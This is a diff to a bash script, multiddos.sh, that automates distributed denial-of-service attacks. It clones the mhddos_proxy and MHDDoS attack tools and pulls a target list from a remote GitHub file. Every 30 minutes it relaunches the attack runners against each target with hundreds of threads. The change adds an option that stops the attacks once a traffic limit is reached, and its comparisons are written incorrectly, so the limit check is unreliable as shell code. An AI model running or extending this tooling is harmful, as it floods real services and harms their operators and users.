@@ -12,6 +12,7 @@ uashield="off"
 vnstat="off"
 matrix="off"
 threads="-t 500"
+limit=0
 #rpc="--rpc 2000"
 export debug="--debug"
 
@@ -73,6 +74,7 @@ usage: bash multiddos.sh [-d|-u|-t|-m|-h]
                             -t | --threads        - threads; default = 1000
                             +m | --matrix         - enable matrix
                             +v | --vnstat         - enable vnstat -l (traffic monitoring)
+                            +l | --limit          - enable limit; default = 0, 0 is ignored, should be in bytes
                             -h | --help           - brings up this menu
 EOF
 exit
@@ -88,6 +90,7 @@ while [ "$1" != "" ]; do
         +m | --matrix )   matrix="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="on"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
+        +l | --limit) export limit="$2"; shift 2 ;;
         -h | --help )    usage;   exit ;;
         *  )   usage;   exit ;;
     esac
@@ -101,13 +104,23 @@ pip install --upgrade pip
 cat > auto_bash.sh << 'EOF'
 cd ~/multidd/
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+git clone https://github.com/G3nko0/traffic_proc_killer.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 git clone https://github.com/MHProDev/MHDDoS.git
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-pkill -f start.py; pkill -f runner.py 
+    pkill -f start.py; pkill -f runner.py
+    if [ $limit > 0 ]; then
+        current_total=$(vnstat --json y | python3 -c "import sys, json; print(sum([ifc['traffic']['total']['tx']+ifc['traffic']['total']['rx'] for ifc in json.load(sys.stdin)['interfaces']]))")
+        echo "Limit is set to ${limit}, current total ${current_total}"
+        if [ $current_total > $limit ]; then
+            echo "Finish loop: traffic ${total} has reached the ${limit}"
+            tmux kill-session -t multiddos; sudo pkill node; sudo pkill shield
+            break
+        fi
+    fi
      # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
     list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
          while [[ $list_size = "0"  ]]; do
@@ -117,7 +130,7 @@ pkill -f start.py; pkill -f runner.py
    for (( i=1; i<=list_size; i++ )); do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
             python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
-      done
+   done
 sleep 30m
 done
 EOF
